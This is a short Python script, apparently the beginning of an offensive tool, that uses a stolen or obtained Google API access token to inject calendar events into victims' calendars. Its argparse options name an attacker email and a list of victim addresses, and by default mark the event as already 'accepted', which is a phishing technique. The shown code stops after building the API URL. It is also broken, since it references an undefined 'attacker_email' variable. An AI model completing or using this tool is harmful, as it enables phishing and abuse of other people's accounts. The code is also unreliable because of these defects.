import requests
import argparse

parser = argparse.ArgumentParser(description='This module will connect to '
    + 'Google\'s API using an access token and inject a calendar event into a '
    + 'target\'s calendar.')
parser.add_argument('-e', '--attacker_email', required=True, type=str,
    help='Email address of the Google account you are doing the injection as. '
    + '(Attacker email address)')
parser.add_argument('-x', '--targets', required=True, type=str,
    help='Comma-seperated list of victim email addresses')
parser.add_argument('-a', '--access_token', required=True, type=str,
    help='Google API Access Token.')
parser.add_argument('-s', '--start_DateTime', required=True, type=str,
    help='Start date and time for the event in the format of YYYY-MM-DDTHH:MM:SS'
    + 'like this: 2019-08-16T20:00:00 for August 16, 2019 at 8:00:00 PM')
parser.add_argument('-f', '--finish_DateTime', required=True, type=str,
    help='Finish date and time for the event in the format of YYYY-MM-DDTHH:MM:SS'
    + 'like this: 2019-08-16T20:00:00 for August 16, 2019 at 8:00:00 PM')
parser.add_argument('-t', '--event_title', required=False, type=str,
    help='Title of the Google calendar event')
parser.add_argument('-l', '--event_location', required=False, type=str,
    help='Location field for the event')
parser.add_argument('-d', '--event_description', required=False, type=str,
    help='Description field for the event')
parser.add_argument('-z', '--time_zone', required=False, type=str,
    default='America/New_York', help='Time zone for the event in the format '
    + '"America/New_York"')
parser.add_argument('-m', '--allow_modify', required=False, type=str,
    default='false', help='If set to true allows targets to modify the calendar '
    + 'entry')
parser.add_argument('-i', '--allow_invite_others', required=False, type=str,
    default='true', help='If set to true allows targets to invite others to the '
    + 'calendar entry')
parser.add_argument('-o', '--show_invitees', required=False, type=str,
   default='false', help='If set to true will show all guests added to the event')
parser.add_argument('-r', '--response_status', required=False, type=str,
    default='accepted', help='Can be "needsAction", "declined", "tentative", or '
    + '"accepted"')


args = parser.parse_args()
# api endpoint
URL = "https://www.googleapis.com/calendars/" + attacker_email + "/events"
